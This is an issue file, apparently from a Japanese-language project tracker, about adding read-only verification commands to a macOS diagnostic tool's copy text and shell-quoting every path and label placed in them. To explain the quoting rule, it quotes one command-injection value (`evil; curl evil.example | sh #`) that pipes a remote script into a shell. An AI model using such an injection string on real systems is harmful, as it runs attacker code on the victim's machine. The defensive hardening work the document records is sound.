# 183 ux: `Y` のコピー文に「なぜ出たか」を確かめる裏取りコマンドが無い

起票日: 2026-09-02
重要度: **P3**
関連: [issues/163](163-audit-doctor-implementation-red-team.md) (体 6 の提案) / [issues/148](148-feat-glogx-doctor-disk-diagnosis.md) (「④ への追加要件」の Y = 別セッションの LLM にそのまま投げられる形)

## 対象

`src/glogx/doctor_view.go` の `diskCopyText` / `svcCopyText` / brew 行のコピー文

## 何が起きるか

`Y` のコピー文には判定・合計・復元方法・対象一覧が入っているが、**その候補が本当に消してよいかを人 (または別セッションの LLM) が
自分で確かめるコマンド**が入っていない。issue 148 は Y を「別セッションの LLM にそのまま投げられる形」と定義しているので、
裏取り手段が無いと受け手は判定を鵜呑みにするしかない。

## 対応案 (2026-09-03 の反証レビューで書き直した)

🚨 **起票時 (2026-09-02) の表をそのまま実装してはいけない。** レビューが P1 を 2 件、P2 を 2 件出し、
すべて実コードで裏が取れた。以下は訂正後。

### 🚨 必須の前提: プレースホルダは必ず `svc.ShellQuote` を通す

起票時の表は `du -sk <各 Item.Path>` のように**引用なしのプレースホルダ**で書いていた。
そのまま実装すると **issue 178 / 193 が塞いだ穴を新設する**。

`src/doctor/svc/scan.go` は 2026-09-03 の敵対レビューを受けて `shellSafeRe` (allowlist) +
`ShellQuote` を新設し、「**パスをコマンド行へ入れる経路は必ずここを通す**」と明文化している
(`manualCommands` のコメント: Label は plist が決める任意文字列で、
`evil; curl evil.example | sh #` のようなラベルが**実走査で成立する**)。
Container 名と `Item.Path` も攻撃者が置ける値なので同じ扱いが要る。

### 訂正後の表

| ID / 種別 | 裏取りコマンド | 起票時からの変更 |
|---|---|---|
| `simulator-runtimes` | `xcrun simctl runtime list -j` | — (実測 rc=0) |
| `coresimulator-orphan` | `xcrun simctl list devices -j` (出力から UUID を探す) | `\| grep <UUID>` をやめる (UUID の引用が要るうえ、JSON を grep させる形が雑) |
| `orphan-container` | `ls /Applications ~/Applications` | 🚨 **`mdfind` を削除**。下記 |
| `brew-orphan-state` / `brew-cleanup-residue` | `brew list --formula` / `brew cleanup --dry-run` | `brew info --json=v2 --installed \| jq` をやめる (実測で数百 KB の JSON。実装の台帳は 1 つなので svc C と同じ `brew list --formula` に揃える) |
| `versionmanager-orphan-root` | `echo $RBENV_ROOT $NODENV_ROOT $GOENV_ROOT` / `rbenv root` | — |
| `chrome-tmp` (blocked) | (足さない) | **削除**。blocked の Reason が既にプロセス名を名指ししており、`pgrep -x` は不在時 rc=1 / 出力空で読み手に曖昧 |
| `xctest-*` / `launchd-tmp` (boottime) | `sysctl kern.boottime` | `stat -f %Sm <path>` を削除 (`diskCopyText` が各 Item の最終更新を既に出す) |
| **`finder-nsird`** | `ls -la <各 Item.Path>` (コピー元が残っているか目で見る) | 🆕 **追加**。カタログにあるのに表から漏れていた |
| **`swiftui-drag-cache`** | 同上 | 🆕 **追加**。同上 |
| svc A (実行ファイル不在) | `ls -l <MissingExec>` / `plutil -p <plist>` | `\| grep -A2 Program` をやめる (plutil の出力は短い) |
| svc B (再起動ループ) | `launchctl list \| grep <label>` / `launchctl print <Domain>/<Label>` | 🚨 **`gui/$(id -u)/` 決め打ちをやめる**。`f.Domain` は `system` を取りうる (`Annotations` が「system は launchctl list に出ない」と明記)。`manualCommands` と同じく `f.Domain+"/"+f.Label` にする |
| svc C (brew 孤児) | `brew list --formula` | — |

**`du -sk <path>` は全 ID から削除した**。`diskCopyText` は各 Item の `HumanSize`、最終更新、合計、
`Contents` を既に出しており、`du` は情報を増やさない。

### 🚨 `mdfind` は載せない (起票時の判定が誤りだった)

起票時は「単独の判定材料にしないという注意を添えれば載せてよい」と書いたが、**誤り**。
`src/doctor/disk/catalog.go` の `orphan-container` の Detail は
「`/Applications` と `~/Applications` の Info.plist を**実走査して突合 (mdfind は使わない)**」で、
判定は `GuardOrphanApp` が実走査でやっている。**既に否定された手段をコピー文で復活させる**形になる。

### svc 側は一部が既に済んでいる (起票時に見落としていた)

`svcUndiagnosedCopyText` (`doctor_view.go`) は **issue 180 の対応で既に**
`plutil -p` / `ls -l` を **`ShellQuote` 付きで**出している。この issue の対象は
`diskCopyText` と `svcCopyText` の 2 つ。

🚨 `svcCopyText` が出している `f.Commands` は `manualCommands` = `launchctl bootout` / `rm` の
**破壊コマンド**で、裏取り (読み取り) ではない。**ここが本当の欠落**。

## 受け入れ条件

- [x] 各 ID のコピー文に裏取りコマンドが入っている (プレースホルダが実値に置換されている)
- [x] 🚨 すべてのプレースホルダが `svc.ShellQuote` を通っている
- [x] `launchctl print` が `f.Domain` を使っている
- [x] `mdfind` を出していないこと
- [x] 変異検証: `ShellQuote` を外すとテストが red になる

## 対応 (2026-09-03)

`diskVerifyCommands` と `svcVerifyCommands` を新設し、`diskCopyText` / `svcCopyText` から呼ぶ。
**見出しを「この判定を自分で確かめるコマンド (読み取りのみ)」と
「消すと決めたら手動で実行するコマンド」に分けた** — svc 側は既存の `f.Commands` が
`launchctl bootout` / `rm` の破壊コマンドで、裏取りと混ぜると読み手が取り違える。

実際の出力 (svc、`homebrew.mxcl.mysql@8.0` の例):

```
この判定を自分で確かめるコマンド (読み取りのみ):
  plutil -p /L/homebrew.mxcl.mysql@8.0.plist
  launchctl print gui/501/homebrew.mxcl.mysql@8.0
  ls -l /opt/homebrew/opt/mysql/bin/mysqld
  launchctl list | grep homebrew.mxcl.mysql@8.0
  brew list --formula | grep mysql@8.0
消すと決めたら手動で実行するコマンド (ツールは実行しない):
  launchctl bootout gui/501/homebrew.mxcl.mysql@8.0
```

判定の種類で出す内容を変える: A なら `ls -l <MissingExec>` / B なら `launchctl list | grep` /
C なら `brew list --formula | grep <formula>`。`plutil -p` と `launchctl print` は常に出す。

disk 側は ID ごと。Items が多いエントリでコピー文が読めなくならないよう **上限 5 本** を置いた。

### 変異検証 (使い捨て worktree、6 本とも red)

| 変異 | 最初に落ちた assert |
|---|---|
| disk 側の `ShellQuote` を外す | パスを引用せずにコマンドへ埋めた |
| svc 側の `ShellQuote` を外す | Label を引用せずにコマンドへ埋めた |
| `gui/501/` の決め打ちに戻す | system ドメインなのに gui/ を決め打ちしている |
| `mdfind` を復活させる | 否定された判定材料をコピー文に出した |
| コマンド数の上限を外す | 裏取りコマンドが上限 5 を超えた (20 本) |
| 読み取りコマンドを出すのをやめる (配線) | コピー文にコマンドが無い |

🚨 1 本目は最初ビルド不能だった (`q` が未使用になる)。当て直して red を確認した。

`make test` rc=0。

## この issue の反証レビュー (2026-09-03、opus)

issue 207 の約束「183 に着手するときその issue だけ反証レビューを通す」に従って実施。
**起票から 1 日で周辺が動いており、表をそのまま実装すると P1 が 2 件立つ**ことが分かった。

| 指摘 | 判定 |
|---|---|
| P1: プレースホルダが引用なしで、178/193 の信頼境界と衝突 | **採用**。`ShellQuote` を必須にした |
| P1: `mdfind` はカタログが「使わない」と明記した手段 | **採用**。表から削除した |
| P2: `svcUndiagnosedCopyText` は 180 で既に対応済み (対象から漏れていた) | **採用**。対象を明記した |
| P2: `launchctl print` の `gui/` 決め打ちは `system` ドメインで誤り | **採用**。`f.Domain` を使う |
| P2: `finder-nsird` / `swiftui-drag-cache` が表から漏れている | **採用**。追加した |
| P3: `du -sk` / `stat -f %Sm` / `pgrep` は既存出力と重複 | **採用**。削除した |
| P3: brew の 2 行が非対称 (実装の台帳は 1 つ) | **採用**。`brew list --formula` に揃えた |

**反証できなかった主張**: 「`diskCopyText` に裏取りコマンドが 1 つも無い」は真 (関数全文を確認)。
提案コマンドの有効性も実測で確認 (`xcrun simctl runtime list -j` / `list devices -j` /
`sysctl kern.boottime` / `stat -f %Sm` / `brew info` はいずれも rc=0)。
179 / 182 / 193 がこの issue を先取りしている事実は無し。

**未確認**: 「コピー文が長すぎて逆効果になる」形 (実際の行数を測っていない)。実装時に測る。
